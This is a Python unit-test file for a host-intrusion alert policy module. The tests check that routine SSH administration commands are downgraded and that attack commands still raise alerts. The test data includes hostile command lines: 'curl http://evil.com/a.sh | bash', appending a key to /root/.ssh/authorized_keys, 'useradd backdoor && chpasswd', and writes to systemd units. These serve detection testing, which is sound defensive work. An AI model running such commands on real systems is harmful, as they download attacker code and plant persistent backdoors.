#!/usr/bin/env python3
"""Tests for behavior-policy.md integration."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from behavior_policy import apply_behavior_policy, evaluate_item  # noqa: E402


class TestBehaviorPolicy(unittest.TestCase):
    def test_persistence_policy_requires_write_not_path_mention(self):
        for command, writes in (("ls /etc/systemd/system/", False),
                                ("grep ExecStart /etc/systemd/system/x.service", False),
                                ("cp /etc/systemd/system/x.service /backup/x.service", False),
                                ("crontab -l", False),
                                ("cp /tmp/x /etc/systemd/system/x.service", True),
                                ("echo key >> /root/.ssh/authorized_keys", True),
                                ("chpasswd", True)):
            with self.subTest(command=command):
                item = {"risk_module": "exec", "severity": "P2", "listener_process": "sshd",
                        "listener_port": 22, "command": command, "matched_rules": []}
                updated, _ = evaluate_item(item)
                if writes:
                    self.assertTrue(updated["alert_required"])
                    self.assertIn(updated["policy_tier"], {"hard_guardrail", "force_alert"})
                else:
                    self.assertNotIn(updated["policy_tier"], {"hard_guardrail", "force_alert"})

    def test_web_shell_force_alert(self) -> None:
        item = {
            "risk_id": "risk-web",
            "risk_module": "exec",
            "severity": "P0",
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "listener_port": 80,
            "listener_process": "nginx",
            "exe": "/bin/bash",
            "command": "sh -c id",
            "matched_rules": ["external_listener_shell_exec"],
        }
        updated, hit = evaluate_item(item)
        self.assertEqual(hit["rule_id"], "WEB-SHELL-001")
        self.assertTrue(updated["alert_required"])
        self.assertFalse(updated["alert_suppressed"])
        self.assertEqual(updated["policy_rule_id"], "WEB-SHELL-001")

    def test_sshd_ops_downgrade(self) -> None:
        item = {
            "risk_id": "risk-ssh",
            "risk_module": "exec",
            "severity": "P0",
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "listener_port": 22,
            "listener_process": "sshd",
            "command": "grep error /var/log/messages",
            "matched_rules": ["external_listener_shell_exec"],
        }
        updated, hit = evaluate_item(item)
        self.assertEqual(hit["rule_id"], "OPS-SSH-001")
        self.assertFalse(updated["alert_required"])
        self.assertTrue(updated["alert_suppressed"])
        self.assertEqual(updated["severity"], "P3")

    def test_sshd_persistence_not_downgraded(self) -> None:
        item = {
            "risk_id": "risk-persist",
            "risk_module": "exec",
            "severity": "P0",
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "listener_port": 22,
            "listener_process": "sshd",
            "command": "useradd backdoor && chpasswd",
            "matched_rules": ["persistence_modify"],
        }
        updated, hit = evaluate_item(item)
        self.assertIn(hit["rule_id"], ("SSH-IMPACT-001", "HARD-GUARDRAIL-PERSISTENCE_MODIFY"))
        self.assertTrue(updated["alert_required"])
        self.assertFalse(updated["alert_suppressed"])

    def test_cloud_metadata_suppress(self) -> None:
        item = {
            "risk_id": "risk-meta",
            "risk_module": "exec",
            "severity": "P0",
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "listener_port": 22,
            "listener_process": "sshd",
            "command": "curl http://100.100.100.200/latest/meta-data/region-id",
            "matched_rules": ["download_and_execute"],
        }
        updated, hit = evaluate_item(item)
        self.assertEqual(hit["rule_id"], "OPS-CLOUD-001")
        self.assertFalse(updated["alert_required"])

    def test_malicious_download_stays_alert(self) -> None:
        item = {
            "risk_id": "risk-evil",
            "risk_module": "exec",
            "severity": "P0",
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "listener_port": 443,
            "listener_process": "nginx",
            "command": "curl http://evil.com/a.sh | bash",
            "matched_rules": ["download_and_execute"],
        }
        updated, hit = evaluate_item(item)
        self.assertEqual(hit["rule_id"], "DOWNLOAD-MALICIOUS-001")
        self.assertTrue(updated["alert_required"])

    def test_apply_batch(self) -> None:
        items = [
            {
                "risk_id": "a",
                "risk_module": "exec",
                "severity": "P0",
                "listener_port": 22,
                "listener_process": "sshd",
                "command": "ls -la",
                "matched_rules": ["external_listener_shell_exec"],
            }
        ]
        out, hits, meta = apply_behavior_policy(items)
        self.assertTrue(meta["applied"])
        self.assertEqual(len(hits), 1)
        self.assertFalse(out[0]["alert_required"])


if __name__ == "__main__":
    unittest.main()
